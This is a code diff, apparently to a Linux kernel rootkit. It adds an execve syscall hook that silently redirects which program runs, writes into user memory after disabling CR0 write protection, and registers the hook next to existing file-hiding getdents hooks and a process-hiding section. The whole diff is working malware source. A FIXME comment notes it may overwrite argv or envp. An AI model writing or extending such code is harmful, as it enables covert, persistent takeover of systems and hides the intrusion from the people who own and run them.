@@ -216,6 +216,50 @@ asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	return ret;
 }
 
+asmlinkage long
+new_sys_execve(const char *__filename, const char **argv, const char **envp)
+{
+	int r;
+	char *old_path, *new_path;
+	char *filename = (char *)__filename;
+	SYS_STATS_INC(execve);
+
+	old_path = anima_vmalloc(MAX_PATH_LEN);
+	if (!old_path)
+		goto out;
+
+	r = ksyms._copy_from_user(old_path, filename, MAX_PATH_LEN);
+	if (r)
+		goto free_old_path;
+
+	old_path[MAX_PATH_LEN-1] = 0;
+
+	new_path = redirect_execve((char *)old_path);
+	if (new_path) {
+		unsigned int new_path_len = anima_strlen(new_path);
+		int path_len_delta = (int)new_path_len - (int)anima_strlen(old_path);
+
+		pr_debug("%s: redirect %s to %s\n", __func__, old_path, new_path);
+
+		if (path_len_delta < 0)
+			path_len_delta = 0;
+		filename -= path_len_delta;
+
+		/* FIXME: check if we are overwriting argv or envp */
+		cr0_wp_enter();
+		r = ksyms._copy_to_user(filename, new_path, new_path_len+1);
+		cr0_wp_exit();
+		if (r) {
+			/* restore filename pointer */
+			filename += path_len_delta;
+		}
+	}
+free_old_path:
+	anima_vfree(old_path);
+out:
+	return ksyms.old_sys_execve(filename, argv, envp);
+}
+
 asmlinkage long new_sys_getpgid(pid_t pid)
 {
 	SYS_STATS_INC(getgid);
@@ -569,6 +613,7 @@ int hook_sys_call_table(void)
 	//HOOK(newfstatat, new_sys_fstatat);
 	HOOK(getdents, new_sys_getdents);
 	HOOK(getdents64, new_sys_getdents64);
+	HOOK(execve, new_sys_execve);
 
 	/* hide process */
 	HOOK(getpgid, new_sys_getpgid);
